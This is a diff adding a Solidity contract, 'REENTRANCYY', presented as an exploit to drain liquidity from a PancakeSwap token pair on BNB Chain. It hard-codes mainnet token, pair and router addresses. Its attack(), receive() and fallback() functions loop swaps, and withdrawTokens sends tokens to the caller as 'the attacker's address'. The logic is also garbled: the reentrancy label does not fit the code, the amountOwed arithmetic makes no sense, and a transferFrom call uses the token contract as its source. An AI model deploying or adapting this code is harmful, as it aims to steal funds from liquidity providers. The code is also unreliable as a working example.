@@ -1,0 +1,116 @@
+// SPDX-License-Identifier: Unlicensed
+pragma solidity ^0.8.0;
+
+interface IBEP20 {
+    function transfer(address to, uint256 value) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 value) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+}
+
+interface IPancakeSwapPair {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address owner) external view returns (uint256);
+    function approve(address spender, uint256 value) external returns (bool);
+    function transfer(address to, uint256 value) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+    function sync() external;
+}
+
+interface IPancakeSwapRouter {
+    function WBNB() external pure returns (address);
+    function getAmountsOut(uint amountIn, address[] memory path) external view returns (uint[] memory amounts);
+    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+        external returns (uint[] memory amounts);
+}
+
+
+contract REENTRANCYY {
+    uint256 public amountOwed;
+    address public tokenContractAddress = 0x6276dea68C8A9bB688813687605663E7a28eb48c; // replace with BEP-20 token contract address
+    address public pairContractAddress = 0x1B96B92314C44b159149f7E0303511fB2Fc4774f; // PancakeSwap V2 WBNB/BUSD pair contract address
+    address public routerContractAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap router contract address
+    IBEP20 public tokenContract;
+    IPancakeSwapPair public pairContract;
+    IPancakeSwapRouter public routerContract;
+
+    constructor() payable {
+        tokenContract = IBEP20(tokenContractAddress);
+        pairContract = IPancakeSwapPair(pairContractAddress);
+        routerContract = IPancakeSwapRouter(routerContractAddress);
+        amountOwed = msg.value;
+    }
+
+    fallback() external payable {
+        if (amountOwed <= address(this).balance) {
+           
+            tokenContract.approve(routerContractAddress, amountOwed);
+            pairContract.approve(routerContractAddress, pairContract.totalSupply());
+            address[] memory path = new address[](2);
+            path[0] = tokenContractAddress;
+            path[1] = routerContract.WBNB();
+            uint[] memory amounts = routerContract.getAmountsOut(amountOwed, path);
+            routerContract.swapExactTokensForETH(amounts[0], 0, path, address(this), block.timestamp);
+            pairContract.sync();
+            amountOwed = 0;
+        }
+    }
+
+receive() external payable {
+    if (amountOwed <= address(this).balance) {
+        // drain liquidity from vulnerable contract to this contract
+        tokenContract.approve(routerContractAddress, amountOwed);
+        pairContract.approve(routerContractAddress, pairContract.totalSupply());
+        address[] memory path = new address[](2);
+        path[0] = tokenContractAddress;
+        path[1] = routerContract.WBNB();
+        uint[] memory amounts = routerContract.getAmountsOut(amountOwed, path);
+        routerContract.swapExactTokensForETH(amounts[0], 0, path, address(this), block.timestamp);
+        pairContract.sync();
+        amountOwed = 0;
+    }
+}
+
+   function attack() public {
+    // repeatedly call fallback function to drain vulnerable contract's liquidity
+    while (amountOwed > 0) {
+        // approve the token and pair contracts to spend our tokens and LP tokens respectively
+        tokenContract.approve(routerContractAddress, amountOwed);
+        pairContract.approve(routerContractAddress, pairContract.totalSupply());
+
+        // define the path for the swap
+        address[] memory path = new address[](2);
+        path[0] = tokenContractAddress;
+        path[1] = routerContract.WBNB();
+
+        // get the expected output amount of WBNB for the given input amount of tokens
+        uint[] memory amounts = routerContract.getAmountsOut(amountOwed, path);
+
+        // swap the tokens for WBNB
+        routerContract.swapExactTokensForETH(amounts[0], 0, path, address(this), block.timestamp);
+
+        // update the amountOwed by calculating the difference between the original amount and the amount received from the swap
+        uint amountReceived = address(this).balance;
+        uint difference = amountOwed > amountReceived ? amountOwed - amountReceived : 0;
+        amountOwed -= (amountOwed - difference);
+
+        // update the pair contract to reflect the new state after the swap
+        pairContract.sync();
+    }
+}
+
+
+    function getBalance() public view returns (uint256) {
+        // get the balance of this contract's address for the vulnerable token
+        return tokenContract.balanceOf(address(this));
+    }
+
+   function withdrawTokens() public {
+    // withdraw tokens from the vulnerable contract to this contract
+    uint256 balance = tokenContract.balanceOf(address(this));
+    require(tokenContract.transferFrom(tokenContractAddress, address(this), balance), "Token transfer failed");
+
+    // withdraw tokens from this contract to the attacker's address
+    require(tokenContract.transfer(msg.sender, balance), "Token transfer failed");
+}
+}
